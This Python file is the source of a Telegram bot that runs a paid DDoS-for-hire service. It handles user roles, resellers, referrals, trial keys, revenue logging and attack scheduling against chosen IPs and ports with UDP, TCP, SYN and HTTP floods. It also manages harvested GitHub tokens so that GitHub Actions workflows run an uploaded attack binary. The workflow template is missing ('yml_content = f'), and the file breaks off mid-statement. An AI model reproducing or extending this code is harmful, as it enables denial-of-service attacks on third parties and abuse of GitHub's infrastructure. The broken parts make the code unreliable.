import os
import sqlite3
import logging
import threading
import time
import random
import string
import csv
import shutil
import schedule
from datetime import datetime, timedelta
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
from github import Github, GithubException
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)
BOT_TOKEN = "7"
YML_FILE_PATH = ".github/workflows/main.yml"
BINARY_FILE_NAME = "soul"
BINARY_STORAGE_PATH = "stored_binary.bin"
ADMIN_IDS = [1600832237, 7733336238]
DB_PATH = "bot_database.db"
temp_data = {}
current_attacks = {} 
attack_lock = threading.Lock()
cooldown_until = 0
COOLDOWN_DURATION = 40
MAINTENANCE_MODE = False
MAX_ATTACKS = 40
MAX_CONCURRENT_ATTACKS = 3
ATTACK_METHODS = ["VC FLOOD", "BGMI FLOOD", "UDP FLOOD", "TCP FLOOD", "HTTP FLOOD", "SYN FLOOD"]
def init_database():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            role TEXT,
            expiry TEXT,
            banned INTEGER DEFAULT 0,
            ban_reason TEXT,
            added_by INTEGER,
            added_date TEXT,
            custom_attack_limit INTEGER,
            failed_attacks INTEGER DEFAULT 0,
            referral_code TEXT UNIQUE,
            referred_by INTEGER,
            total_attacks INTEGER DEFAULT 0
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS attacks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            ip TEXT,
            port INTEGER,
            duration INTEGER,
            method TEXT,
            start_time REAL,
            end_time REAL,
            status TEXT,
            success_rate REAL,
            servers_used INTEGER
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS tokens (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            token TEXT,
            username TEXT,
            repo TEXT,
            added_date TEXT,
            status TEXT,
            health_score INTEGER DEFAULT 100,
            total_attacks INTEGER DEFAULT 0,
            last_used REAL,
            priority INTEGER DEFAULT 1
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS referrals (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            referrer_id INTEGER,
            referred_id INTEGER,
            bonus_days INTEGER,
            created_at REAL
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS activity_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            action TEXT,
            details TEXT,
            timestamp REAL
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS revenue (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            transaction_type TEXT,
            amount REAL,
            user_id INTEGER,
            date TEXT,
            description TEXT
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS scheduled_attacks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            ip TEXT,
            port INTEGER,
            duration INTEGER,
            method TEXT,
            scheduled_time REAL,
            executed INTEGER DEFAULT 0
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS trial_keys (
            key TEXT PRIMARY KEY,
            hours INTEGER,
            expiry REAL,
            used INTEGER DEFAULT 0,
            used_by INTEGER,
            created_at REAL,
            created_by INTEGER
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS pending_users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            request_date TEXT
        )
    ''')
    conn.commit()
    conn.close()
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    for admin_id in ADMIN_IDS:
        cursor.execute('SELECT user_id FROM users WHERE user_id = ?', (admin_id,))
        if not cursor.fetchone():
            ref_code = generate_referral_code()
            cursor.execute('''
                INSERT INTO users (user_id, username, role, expiry, added_by, added_date, referral_code)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (admin_id, f"owner_{admin_id}", "primary_owner", "LIFETIME", admin_id, 
                  datetime.now().strftime("%Y-%m-%d %H:%M:%S"), ref_code))
    conn.commit()
    conn.close()
    set_setting('maintenance_mode', '0')
    set_setting('cooldown_duration', '40')
    set_setting('max_attacks', '40')
    set_setting('max_concurrent_attacks', '3')
    set_setting('auto_ban_threshold', '5')
    set_setting('welcome_message', 'Welcome to the DDoS Bot! 🚀')
    set_setting('referral_bonus_days', '3')
    set_setting('rate_limit_seconds', '5')
def log_activity(user_id, action, details=""):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO activity_logs (user_id, action, details, timestamp)
        VALUES (?, ?, ?, ?)
    ''', (user_id, action, details, time.time()))
    conn.commit()
    conn.close()
def add_revenue(transaction_type, amount, user_id, description=""):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO revenue (transaction_type, amount, user_id, date, description)
        VALUES (?, ?, ?, ?, ?)
    ''', (transaction_type, amount, user_id, datetime.now().strftime("%Y-%m-%d"), description))
    conn.commit()
    conn.close()
def get_setting(key, default=None):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT value FROM settings WHERE key = ?', (key,))
    result = cursor.fetchone()
    conn.close()
    return result[0] if result else default
def set_setting(key, value):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', (key, str(value)))
    conn.commit()
    conn.close()
def generate_referral_code():
    while True:
        code = f"REF-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('SELECT user_id FROM users WHERE referral_code = ?', (code,))
        if not cursor.fetchone():
            conn.close()
            return code
        conn.close()
def is_user_banned(user_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT banned FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    conn.close()
    return result and result[0] == 1
def ban_user(user_id, reason="No reason provided"):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET banned = 1, ban_reason = ? WHERE user_id = ?', (reason, user_id))
    conn.commit()
    conn.close()
def unban_user(user_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET banned = 0, ban_reason = NULL WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()
def search_users(query):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''
        SELECT user_id, username, role, expiry, banned 
        FROM users 
        WHERE CAST(user_id AS TEXT) LIKE ? OR username LIKE ?
        LIMIT 20
    ''', (f'%{query}%', f'%{query}%'))
    results = cursor.fetchall()
    conn.close()
    return results
def get_user_info(user_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    conn.close()
    return result
def is_primary_owner(user_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT role FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    conn.close()
    return result and result[0] == "primary_owner"
def is_owner(user_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT role FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    conn.close()
    return result and result[0] in ["primary_owner", "owner", "limited_owner"]
def is_admin(user_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT role FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    conn.close()
    return result and result[0] == "admin"
def is_reseller(user_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT role FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    conn.close()
    return result and result[0] == "reseller"
def is_approved_user(user_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT expiry FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    if result:
        expiry = result[0]
        if expiry == "LIFETIME":
            conn.close()
            return True
        try:
            expiry_time = float(expiry)
            if time.time() < expiry_time:
                conn.close()
                return True
            else:
                cursor.execute('DELETE FROM users WHERE user_id = ?', (user_id,))
                conn.commit()
        except:
            pass
    conn.close()
    return False
def can_user_attack(user_id):
    if is_user_banned(user_id):
        return False
    maintenance = int(get_setting('maintenance_mode', '0'))
    if maintenance and not (is_owner(user_id) or is_admin(user_id)):
        return False
    return is_owner(user_id) or is_admin(user_id) or is_reseller(user_id) or is_approved_user(user_id)
def get_user_attack_limit(user_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT custom_attack_limit FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    conn.close()
    if result and result[0]:
        return result[0]
    return int(get_setting('max_attacks', '40'))
def get_user_attack_count(user_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT total_attacks FROM users WHERE user_id = ? ', (user_id,))
    result = cursor.fetchone()
    conn.close()
    return result[0] if result else 0
def increment_failed_attacks(user_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET failed_attacks = failed_attacks + 1 WHERE user_id = ?', (user_id,))
    cursor.execute('SELECT failed_attacks FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    conn.commit()
    conn.close()
    if result:
        failed_count = result[0]
        threshold = int(get_setting('auto_ban_threshold', '5'))
        if failed_count >= threshold:
            ban_user(user_id, f"Auto-banned: {failed_count} failed attacks")
            return True
    return False
def log_attack(user_id, ip, port, duration, method, start_time, end_time, status, success_rate, servers_used):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO attacks (user_id, ip, port, duration, method, start_time, end_time, status, success_rate, servers_used)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    ''', (user_id, ip, port, duration, method, start_time, end_time, status, success_rate, servers_used))
    cursor.execute('UPDATE users SET total_attacks = total_attacks + 1 WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()
def get_user_attack_history(user_id, limit=10):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''
        SELECT ip, port, duration, method, start_time, status, success_rate
        FROM attacks
        WHERE user_id = ?
        ORDER BY start_time DESC
        LIMIT ?
    ''', (user_id, limit))
    results = cursor.fetchall()
    conn.close()
    return results
def get_attack_statistics():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT COUNT(*) FROM attacks')
    total_attacks = cursor.fetchone()[0]
    cursor.execute('SELECT COUNT(*) FROM attacks WHERE status = "completed"')
    successful_attacks = cursor.fetchone()[0]
    cursor.execute('SELECT AVG(success_rate) FROM attacks WHERE success_rate IS NOT NULL')
    avg_success_rate = cursor.fetchone()[0] or 0
    cursor.execute('''
        SELECT u.username, COUNT(a.id) as attack_count
        FROM attacks a
        JOIN users u ON a.user_id = u.user_id
        GROUP BY a.user_id
        ORDER BY attack_count DESC
        LIMIT 5
    ''')
    top_users = cursor.fetchall()
    conn.close()
    return {
        'total_attacks': total_attacks,
        'successful_attacks': successful_attacks,
        'avg_success_rate': avg_success_rate,
        'top_users': top_users
    }
def can_start_attack(user_id):
    if is_user_banned(user_id):
        return False, "🚫 **YOU ARE BANNED**\nYour account has been banned."
    maintenance = int(get_setting('maintenance_mode', '0'))
    if maintenance and not (is_owner(user_id) or is_admin(user_id)):
        return False, "⚠️ **MAINTENANCE MODE**\n━━━━━━━━━━━━━━━━━━━━\nBot is under maintenance. Please wait."
    user_limit = get_user_attack_limit(user_id)
    user_count = get_user_attack_count(user_id)
    if user_count >= user_limit:
        return False, f"⚠️ **MAXIMUM ATTACK LIMIT REACHED**\n━━━━━━━━━━━━━━━━━━━━\nYou have used all {user_limit} attack(s). Contact admin for more."
    max_concurrent = int(get_setting('max_concurrent_attacks', '3'))
    if len(current_attacks) >= max_concurrent:
        return False, f"⚠️ **TOO MANY CONCURRENT ATTACKS**\n━━━━━━━━━━━━━━━━━━━━\nMaximum {max_concurrent} attacks can run simultaneously."
    return True, "✅ Ready to start attack"
def start_attack(attack_id, ip, port, duration, user_id, method):
    current_attacks[attack_id] = {
        "ip": ip,
        "port": port,
        "time": duration,
        "user_id": user_id,
        "method": method,
        "start_time": time.time(),
        "estimated_end_time": time.time() + int(duration)
    }
def finish_attack(attack_id, success_rate=100, servers_used=0):
    if attack_id in current_attacks:
        attack = current_attacks[attack_id]
        log_attack(
            attack['user_id'],
            attack['ip'],
            attack['port'],
            attack['time'],
            attack['method'],
            attack['start_time'],
            time.time(),
            'completed',
            success_rate,
            servers_used
        )
        del current_attacks[attack_id]
def stop_attack(attack_id):
    if attack_id in current_attacks:
        attack = current_attacks[attack_id]
        log_attack(
            attack['user_id'],
            attack['ip'],
            attack['port'],
            attack['time'],
            attack['method'],
            attack['start_time'],
            time.time(),
            'stopped',
            0,
            0
        )
        del current_attacks[attack_id]
def schedule_attack(user_id, ip, port, duration, method, scheduled_time):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO scheduled_attacks (user_id, ip, port, duration, method, scheduled_time)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', (user_id, ip, port, duration, method, scheduled_time))
    conn.commit()
    conn.close()
def add_token_to_db(token, username, repo):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO tokens (token, username, repo, added_date, status)
        VALUES (?, ?, ?, ?, ?)
    ''', (token, username, repo, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), 'active'))
    conn.commit()
    conn.close()
def get_all_tokens():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM tokens WHERE status = "active" ORDER BY priority DESC, health_score DESC')
    results = cursor.fetchall()
    conn.close()
    return results
def update_token_health(token_id, health_score):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('UPDATE tokens SET health_score = ? WHERE id = ?', (health_score, token_id))
    conn.commit()
    conn.close()
def increment_token_usage(token_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''
        UPDATE tokens 
        SET total_attacks = total_attacks + 1, last_used = ? 
        WHERE id = ?
    ''', (time.time(), token_id))
    conn.commit()
    conn.close()
def get_token_statistics():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''
        SELECT username, repo, total_attacks, health_score, priority, last_used
        FROM tokens
        WHERE status = "active"
        ORDER BY total_attacks DESC
    ''')
    results = cursor.fetchall()
    conn.close()
    return results
def check_token_health():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT id, token, username FROM tokens WHERE status = "active"')
    tokens = cursor.fetchall()
    healthy_count = 0
    unhealthy_count = 0
    for token_id, token, username in tokens:
        try:
            g = Github(token)
            user = g.get_user()
            _ = user.login
            update_token_health(token_id, 100)
            healthy_count += 1
        except:
            update_token_health(token_id, 0)
            unhealthy_count += 1
    conn.close()
    return healthy_count, unhealthy_count
def redeem_referral_code(user_id, referral_code):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT user_id FROM users WHERE referral_code = ?', (referral_code,))
    referrer = cursor.fetchone()
    if not referrer:
        conn.close()
        return False, "Invalid referral code"
    referrer_id = referrer[0]
    if referrer_id == user_id:
        conn.close()
        return False, "Cannot use your own referral code"
    cursor.execute('SELECT referred_by FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    if result and result[0]:
        conn.close()
        return False, "You have already used a referral code"
    bonus_days = int(get_setting('referral_bonus_days', '3'))
    cursor.execute('SELECT expiry FROM users WHERE user_id = ?', (referrer_id,))
    expiry_result = cursor.fetchone()
    if expiry_result:
        current_expiry = expiry_result[0]
        if current_expiry != "LIFETIME":
            try:
                expiry_timestamp = float(current_expiry)
                new_expiry = expiry_timestamp + (bonus_days * 24 * 60 * 60)
                cursor.execute('UPDATE users SET expiry = ? WHERE user_id = ?', (str(new_expiry), referrer_id))
            except:
                pass
    cursor.execute('UPDATE users SET referred_by = ? WHERE user_id = ?', (referrer_id, user_id))
    cursor.execute('''
        INSERT INTO referrals (referrer_id, referred_id, bonus_days, created_at)
        VALUES (?, ?, ?, ?)
    ''', (referrer_id, user_id, bonus_days, time.time()))
    conn.commit()
    conn.close()
    return True, f"✅ Referral code applied! Referrer gets {bonus_days} bonus days."
def get_referral_stats(user_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT referral_code FROM users WHERE user_id = ?', (user_id,))
    ref_code = cursor.fetchone()
    cursor.execute('SELECT COUNT(*) FROM referrals WHERE referrer_id = ?', (user_id,))
    total_referrals = cursor.fetchone()[0]
    cursor.execute('SELECT SUM(bonus_days) FROM referrals WHERE referrer_id = ?', (user_id,))
    bonus_earned = cursor.fetchone()[0] or 0
    conn.close()
    return {
        'referral_code': ref_code[0] if ref_code else None,
        'total_referrals': total_referrals,
        'bonus_days_earned': bonus_earned
    }
def export_users_csv():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT user_id, username, role, expiry, banned FROM users')
    users = cursor.fetchall()
    conn.close()
    filename = f"users_export_{int(time.time())}.csv"
    with open(filename, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(['UserID', 'Username', 'Role', 'Expiry', 'Banned'])
        writer.writerows(users)
    return filename
def import_users_csv(filepath):
    imported = 0
    skipped = 0
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    with open(filepath, 'r') as f:
        reader = csv.DictReader(f)
        for row in reader:
            try:
                user_id = int(row['UserID'])
                username = row['Username']
                role = row['Role']
                expiry = row['Expiry']
                cursor.execute('SELECT user_id FROM users WHERE user_id = ?', (user_id,))
                if cursor.fetchone():
                    skipped += 1
                    continue
                ref_code = generate_referral_code()
                cursor.execute('''
                    INSERT INTO users (user_id, username, role, expiry, added_date, referral_code)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (user_id, username, role, expiry, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), ref_code))
                imported += 1
            except Exception as e:
                logger.error(f"Error importing user: {e}")
                skipped += 1
    conn.commit()
    conn.close()
    return imported, skipped
def backup_database():
    backup_filename = f"backup_{int(time.time())}.db"
    shutil.copy2(DB_PATH, backup_filename)
    return backup_filename
def restore_database(backup_path):
    shutil.copy2(backup_path, DB_PATH)
def cleanup_old_data():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cutoff_time = time.time() - (30 * 24 * 60 * 60)
    cursor.execute('DELETE FROM attacks WHERE start_time < ?', (cutoff_time,))
    cursor.execute('DELETE FROM activity_logs WHERE timestamp < ?', (cutoff_time,))
    deleted = cursor.rowcount
    conn.commit()
    conn.close()
    logger.info(f"Cleaned up {deleted} old records")
def cleanup_expired_users():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT user_id, expiry FROM users WHERE role = "user"')
    users = cursor.fetchall()
    removed = 0
    for user_id, expiry in users:
        if expiry != "LIFETIME":
            try:
                expiry_time = float(expiry)
                if time.time() > expiry_time:
                    cursor.execute('DELETE FROM users WHERE user_id = ?', (user_id,))
                    removed += 1
            except:
                pass
    conn.commit()
    conn.close()
    logger.info(f"Removed {removed} expired users")
def check_scheduled_attacks():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    current_time = time.time()
    cursor.execute('''
        SELECT id, user_id, ip, port, duration, method
        FROM scheduled_attacks
        WHERE scheduled_time <= ? AND executed = 0
    ''', (current_time,))
    attacks = cursor.fetchall()
    for attack_id, user_id, ip, port, duration, method in attacks:
        logger.info(f"Executing scheduled attack {attack_id} for user {user_id}")
        cursor.execute('UPDATE scheduled_attacks SET executed = 1 WHERE id = ?', (attack_id,))
    conn.commit()
    conn.close()
def send_renewal_reminders():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    current_time = time.time()
    reminder_time = current_time + (24 * 60 * 60)
    cursor.execute('''
        SELECT user_id, username, expiry
        FROM users
        WHERE expiry != "LIFETIME" AND CAST(expiry AS REAL) BETWEEN ? AND ?
    ''', (current_time, reminder_time))
    users = cursor.fetchall()
    conn.close()
    return users
def run_scheduled_tasks():
    schedule.every().day.at("00:00").do(cleanup_old_data)
    schedule.every().day.at("01:00").do(cleanup_expired_users)
    schedule.every(5).minutes.do(check_scheduled_attacks)
    schedule.every().day.at("12:00").do(send_renewal_reminders)
    while True:
        schedule.run_pending()
        time.sleep(60)
def save_binary_file(binary_content):
    try:
        with open(BINARY_STORAGE_PATH, 'wb') as f:
            f.write(binary_content)
        return True
    except Exception as e:
        logger.error(f"Error saving binary: {e}")
        return False
def load_binary_file():
    try:
        if os.path.exists(BINARY_STORAGE_PATH):
            with open(BINARY_STORAGE_PATH, 'rb') as f:
                return f.read()
    except Exception as e:
        logger.error(f"Error loading binary: {e}")
    return None
def upload_binary_to_repo(token, repo_name, binary_content):
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        try:
            existing = repo.get_contents(BINARY_FILE_NAME)
            repo.update_file(BINARY_FILE_NAME, "Update binary", binary_content, existing.sha, branch="main")
            return True, "Updated"
        except:
            repo.create_file(BINARY_FILE_NAME, "Upload binary", binary_content, branch="main")
            return True, "Created"
    except Exception as e:
        return False, str(e)
def create_repository(token, repo_name="soulcrack-tg"):
    try:
        g = Github(token)
        user = g.get_user()
        try:
            repo = user.get_repo(repo_name)
            return repo, False
        except:
            repo = user.create_repo(repo_name, description="Bot Repository", private=False, auto_init=False)
            return repo, True
    except Exception as e:
        raise Exception(f"Failed to create repository: {e}")
def update_yml_file(token, repo_name, ip, port, duration, method):
    yml_content = f
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        try:
            file_content = repo.get_contents(YML_FILE_PATH)
            repo.update_file(YML_FILE_PATH, f"Update {method}", yml_content, file_content.sha)
        except:
            repo.create_file(YML_FILE_PATH, f"Create {method}", yml_content)
        return True
    except Exception as e:
        logger.error(f"Error updating YML: {e}")
        return False
def instant_stop_all_jobs(token, repo_name):
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        total_cancelled = 0
        for status in ['queued', 'in_progress', 'pending']:
            try:
                workflows = repo.get_workflow_runs(status=status)
                for workflow in workflows:
                    try:
                        workflow.cancel()
                        total_cancelled += 1
                    except:
                        pass
            except:
                pass
        return total_cancelled
    except Exception as e:
        logger.error(f"Error stopping jobs: {e}")
        return 0
def get_main_keyboard(user_id):
    keyboard = []
    keyboard.append([KeyboardButton("🎯 Launch Attack"), KeyboardButton("📊 Check Status")])
    keyboard.append([KeyboardButton("🛑 Stop Attack"), KeyboardButton("📜 Attack History")])
    keyboard.append([KeyboardButton("🎁 Referral System"), KeyboardButton("📝 My Profile")])
    if is_owner(user_id) or is_admin(user_id):
        keyboard.append([KeyboardButton("👥 User Management"), KeyboardButton("⚙️ Bot Settings")])
        keyboard.append([KeyboardButton("📈 Statistics"), KeyboardButton("📋 Activity Logs")])
    if is_owner(user_id):
        keyboard.append([KeyboardButton("👑 Owner Panel"), KeyboardButton("🔑 Token Management")])
    keyboard.append([KeyboardButton("❓ Help")])
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
def get_user_management_keyboard():
    keyboard = [
        [KeyboardButton("➕ Add User"), KeyboardButton("➖ Remove User")],
        [KeyboardButton("🔍 Search Users"), KeyboardButton("🚫 Ban User")],
        [KeyboardButton("✅ Unban User"), KeyboardButton("📋 Users List")],
        [KeyboardButton("⏳ Pending Requests"), KeyboardButton("🔑 Generate Trial")],
        [KeyboardButton("📤 Export Users"), KeyboardButton("📥 Import Users")],
        [KeyboardButton("« Back to Main Menu")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
def get_owner_panel_keyboard():
    keyboard = [
        [KeyboardButton("👑 Add Owner"), KeyboardButton("🗑️ Remove Owner")],
        [KeyboardButton("💰 Add Reseller"), KeyboardButton("🗑️ Remove Reseller")],
        [KeyboardButton("📋 Owners List"), KeyboardButton("💰 Resellers List")],
        [KeyboardButton("📢 Broadcast"), KeyboardButton("📤 Upload Binary")],
        [KeyboardButton("💾 Backup Database"), KeyboardButton("♻️ Restore Database")],
        [KeyboardButton("💵 Revenue Report"), KeyboardButton("🎯 Set User Limit")],
        [KeyboardButton("« Back to Main Menu")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
def get_bot_settings_keyboard():
    keyboard = [
        [KeyboardButton("🔧 Toggle Maintenance"), KeyboardButton("⏱️ Set Cooldown")],
        [KeyboardButton("🎯 Set Max Attacks"), KeyboardButton("🚀 Max Concurrent")],
        [KeyboardButton("🚫 Auto-Ban Threshold"), KeyboardButton("💬 Welcome Message")],
        [KeyboardButton("⏰ Rate Limit"), KeyboardButton("🎁 Referral Bonus")],
        [KeyboardButton("🧹 Cleanup Settings"), KeyboardButton("🎨 Attack Methods")],
        [KeyboardButton("« Back to Main Menu")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
def get_token_management_keyboard():
    keyboard = [
        [KeyboardButton("➕ Add Token"), KeyboardButton("📋 List Tokens")],
        [KeyboardButton("🗑️ Remove Token"), KeyboardButton("🏥 Check Health")],
        [KeyboardButton("📊 Token Statistics"), KeyboardButton("🔄 Auto-Rotate")],
        [KeyboardButton("⭐ Set Priority"), KeyboardButton("🧹 Remove Expired")],
        [KeyboardButton("« Back to Main Menu")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
def get_statistics_keyboard():
    keyboard = [
        [KeyboardButton("📊 Attack Stats"), KeyboardButton("👥 User Stats")],
        [KeyboardButton("💰 Revenue Report"), KeyboardButton("🔥 Top Users")],
        [KeyboardButton("🎯 Success Rate"), KeyboardButton("🖥️ Server Performance")],
        [KeyboardButton("« Back to Main Menu")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
def get_cancel_keyboard():
    return ReplyKeyboardMarkup([[KeyboardButton("❌ Cancel")]], resize_keyboard=True)
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_user_banned(user_id):
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('SELECT ban_reason FROM users WHERE user_id = ?', (user_id,))
        reason = cursor.fetchone()
        conn.close()
        await update.message.reply_text(
            f"🚫 **YOU ARE BANNED**\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"Reason: {reason[0] if reason else 'No reason provided'}\n\n"
            f"Contact admin to appeal."
        )
        return
    maintenance = int(get_setting('maintenance_mode', '0'))
    if maintenance and not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(
            "🔧 **MAINTENANCE MODE**\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "Bot is under maintenance.\n"
            "Please wait until it's back."
        )
        return
    if not can_user_attack(user_id):
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('SELECT user_id FROM pending_users WHERE user_id = ?', (user_id,))
        if not cursor.fetchone():
            cursor.execute('''
                INSERT INTO pending_users (user_id, username, request_date)
                VALUES (?, ?, ?)
            ''', (user_id, update.effective_user.username or f"user_{user_id}", 
                  datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
            conn.commit()
            cursor.execute('SELECT user_id FROM users WHERE role IN ("primary_owner", "owner")')
            owners = cursor.fetchall()
            for owner in owners:
                try:
                    await context.bot.send_message(
                        chat_id=owner[0],
                        text=f"🔥 **NEW ACCESS REQUEST**\n━━━━━━━━━━━━━━━━━━━━\n"
                             f"User: @{update.effective_user.username or 'No username'}\n"
                             f"ID: `{user_id}`\nUse User Management to approve"
                    )
                except:
                    pass
        conn.close()
        await update.message.reply_text(
            "📋 **ACCESS REQUEST SENT**\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "Your access request has been sent.\n"
            "Please wait for approval.\n\n"
            f"Your User ID: `{user_id}`"
        )
        return
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT role FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    conn.close()
    if result:
        role = result[0]
        role_display = {
            'primary_owner': '👑 PRIMARY OWNER',
            'owner': '👑 OWNER',
            'limited_owner': '👑 LIMITED OWNER',
            'admin': '🛡️ ADMIN',
            'reseller': '💰 RESELLER',
            'user': '👤 USER'
        }.get(role, '👤 USER')
    else:
        role_display = '👤 USER'
    user_limit = get_user_attack_limit(user_id)
    user_count = get_user_attack_count(user_id)
    remaining = user_limit - user_count
    welcome_msg = get_setting('welcome_message', 'Welcome to the Bot! 🚀')
    message = (
        f"🤖 **{welcome_msg}** 🤖\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{role_display}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🎯 **Remaining Attacks:** {remaining}/{user_limit}\n"
        f"🚀 **Concurrent Attacks:** {len(current_attacks)}/{get_setting('max_concurrent_attacks', '3')}\n"
